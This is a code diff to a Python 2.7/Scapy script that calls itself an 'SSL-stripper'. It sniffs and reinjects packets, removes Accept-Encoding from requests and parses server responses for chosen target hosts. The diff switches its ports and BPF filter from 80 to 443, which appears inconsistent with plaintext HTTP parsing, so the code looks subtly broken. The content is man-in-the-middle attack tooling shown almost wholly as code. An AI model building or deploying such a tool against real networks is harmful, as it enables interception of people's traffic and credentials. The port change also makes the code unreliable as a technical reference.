@@ -117,7 +117,7 @@ def proc(pkt, iface, host_filter):
     state = flows[fkey]
 
     # --------------------- client → server (strip Accept-Encoding) ----------
-    if tcp.dport in (80, 8080, 8000):               # cheap “common‐ports” test
+    if tcp.dport in (443, 8080, 8000):               # cheap “common‐ports” test
         payload = str(pkt[Raw].load)
         if host_filter and not any(h.encode() in payload for h in host_filter):
             return
@@ -134,7 +134,7 @@ def proc(pkt, iface, host_filter):
         return
 
     # --------------------- server → client (headers / body) -----------------
-    if tcp.sport in (80, 8080, 8000):
+    if tcp.sport in (443, 8080, 8000):
         payload = str(pkt[Raw].load)
         if HDR_END_RE.search(payload[:4096]):       # first segment w/ hdrs
             head, body = payload.split(b'\r\n\r\n', 1)
@@ -157,8 +157,8 @@ def proc(pkt, iface, host_filter):
 def main():
     ap = argparse.ArgumentParser(description='SSL-stripper (Python 2.7, Scapy)')
     ap.add_argument('-i', '--iface', help='interface to sniff/reinject')
-    ap.add_argument('--bpf', default='tcp port 80',
-                    help='extra/alternative BPF (ANDed) [default: tcp port 80]')
+    ap.add_argument('--bpf', default='tcp port 443',
+                    help='extra/alternative BPF (ANDed) [default: tcp port 443]')
     ap.add_argument('--hosts',
                     help='comma-separated hostnames or wildcards to target')
     vq = ap.add_mutually_exclusive_group()
